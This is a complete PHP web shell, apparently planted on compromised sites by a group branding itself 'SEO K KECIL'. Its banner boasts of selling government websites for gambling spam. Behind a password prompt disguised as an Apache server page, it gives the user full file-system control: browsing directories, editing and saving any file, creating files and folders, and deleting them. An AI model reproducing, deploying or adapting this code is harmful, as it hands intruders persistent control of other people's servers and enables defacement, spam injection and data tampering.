<?php
$password = "SEOKGANTENG@#@#"; // password
session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit", -1);
$sessioncode = md5(__FILE__);
if (!empty($password) and $_SESSION[$sessioncode] != $password) {
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        $_SESSION[$sessioncode] = $password;
    } else {
        print "
<html>
<head>
    <title>SEO K GANTENG</title>
    <style>
        body {
            color: red;
            font-family: monospace;
        }
        pre {
            color: red;
        }
        p {
            color: red;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <pre>
 ___________________________
 SEO K KECIL

  ______   ________   ______         __    __        __    __  ________   ______   ______  __       
 /      \ /        | /      \       /  |  /  |      /  |  /  |/        | /      \ /      |/  |      
/$$$$$$  |$$$$$$$$/ /$$$$$$  |      $$ | /$$/       $$ | /$$/ $$$$$$$$/ /$$$$$$  |$$$$$$/ $$ |      
$$ \__$$/ $$ |__    $$ |  $$ |      $$ |/$$/        $$ |/$$/  $$ |__    $$ |  $$/   $$ |  $$ |      
$$      \ $$    |   $$ |  $$ |      $$  $$<         $$  $$<   $$    |   $$ |        $$ |  $$ |      
 $$$$$$  |$$$$$/    $$ |  $$ |      $$$$$  \        $$$$$  \  $$$$$/    $$ |   __   $$ |  $$ |      
/  \__$$ |$$ |_____ $$ \__$$ |      $$ |$$  \       $$ |$$  \ $$ |_____ $$ \__/  | _$$ |_ $$ |_____ 
$$    $$/ $$       |$$    $$/       $$ | $$  |      $$ | $$  |$$       |$$    $$/ / $$   |$$       |
 $$$$$$/  $$$$$$$$/  $$$$$$/        $$/   $$/       $$/   $$/ $$$$$$$$/  $$$$$$/  $$$$$$/ $$$$$$$$/ 
                                                                                                    
                                                                                                    
                                                                                                    
    </pre>
    <p>JIKA UMR KAMI 1RB $ KAMI AKAN BERHENTI MENJUAL WEBSITE PEMERINTAH UNTUK JUDOL.</p>
	<hr>
<address>Apache Server at ".$_SERVER["HTTP_HOST"]." Port 80 </address>
<style>
input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
<center>
</body>
<pre align=center><font>
</font><form method=post> <input type='password' name='pass'></form></pre>";
        exit;        
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SEO K Kecil Grafiti</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            text-align: center;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        h1 {
            font-size: 60px;
            color: red;
            text-shadow: 
                2px 2px 0 #fff,
                4px 4px 0 #ff7f50,
                6px 6px 0 #ff4500,
                8px 8px 0 #8b0000;
            letter-spacing: 5px;
            text-transform: uppercase;
            padding: 20px;
            background: linear-gradient(135deg, #4facfe, #00f2fe, #43e97b, #f8ffae);
            background-size: 400% 400%;
            border-radius: 15px;
            animation: gradientBG 8s ease infinite;
            display: inline-block;
        }
        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        form {
            display: inline;
        }
        textarea {
            padding: 10px;
        }
    </style>
</head>
<body>
    <center><h1>SEO K KECIL</h1></center>
<script type="text/javascript">
<!--                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            -->
</script>
<noscript><i>Javascript required</i></noscript>
<?php
if(isset($_GET["f"])&&$_GET["f"]!=null){$f=$_GET["f"];} else{ $f=".";}

echo "root web : ". $_SERVER['DOCUMENT_ROOT'] .'<hr>';

function myfunction($value,$key){
    global $f;
    echo "<a href='?f=".explode("/$value",realpath($f))[0]."/".htmlentities($value)."'>".htmlentities($value)."</a>/";
}

echo "<hr>";

$curFile=$_SERVER['REQUEST_SCHEME'] .'://'. $_SERVER['HTTP_HOST']. explode('?', $_SERVER['REQUEST_URI'], 2)[0];

echo '<form action="" method="post"> <input name="mkdir" style="width:100px;" required> <input type="submit" value="MKDIR"/> </form>';

echo '<form action="" method="post"> <input name="mkfile" style="width:100px;" required> <input type="submit" value="MAKE FILE"/> </form>';

echo "<br>";

if(isset($_GET["edit"])){
    $arrPath=explode("/",dirname(realpath($f)));
    array_walk($arrPath,"myfunction");
    
if (isset($_POST['text'])){
    file_put_contents($f, $_POST['text']);
}
$text = file_get_contents($f);

echo '<form action="" method="post"> <textarea name="text" style="width:100%;height:60%;">'.htmlspecialchars($text).'</textarea> <input type="submit" value="SAVE"/> </form>';
}
else{
    $arrPath=explode("/",realpath($f));
    array_walk($arrPath,"myfunction");
    
    if(isset($_POST["mkfile"])){
        echo file_put_contents($f."/".$_POST["mkfile"],"");
    }
    
    if(isset($_GET["unlink"])){
        unlink($f."/".$_GET["unlink"]);
    }
    
    if(isset($_POST["mkdir"])){
        mkdir($f."/".$_POST["mkdir"]);
    }
    
    echo "<table> <tr> <th>folder</th> <th>izin</th> <th> url </th> <th>options</th> </tr>";
    
    $data = scandir(is_dir($f)?$f:realpath($f));

 foreach ($data as $value) {
  $lastMod=date("d-m-Y H:i.", filemtime("$f/$value"));
  $url= str_replace($_SERVER['DOCUMENT_ROOT'],$_SERVER['REQUEST_SCHEME'] .'://'.$_SERVER['HTTP_HOST'],realpath("$f/$value"));

  if(is_dir("$f/$value")){
    echo "<tr> <td> <a href='?f=$f/".str_replace("&","%26",$value)."'>".htmlentities($value)."</a> </td> <td>".substr(sprintf("%o", fileperms("$f/$value")),-4)." </td> <td> ". $url ." </td> <td> <a href='?f=".str_replace("&","%26",$f)."&rmdir=$value'>delete</a> </td> </tr>";
  }
  else{
    echo "<tr> <td> <a href='?f=".str_replace("&","%26",$f)."/$value&edit=true'>$value</a> </td> <td>".substr(sprintf("%o", fileperms("$f/$value")),-4)." </td> <td> ". $url ." </td>  <td> <a href='?f=".str_replace("&","%26",$f)."&unlink=$value'>delete</a> </td> </tr>"; 
  }
 }
  
echo "</table>";
}

?>
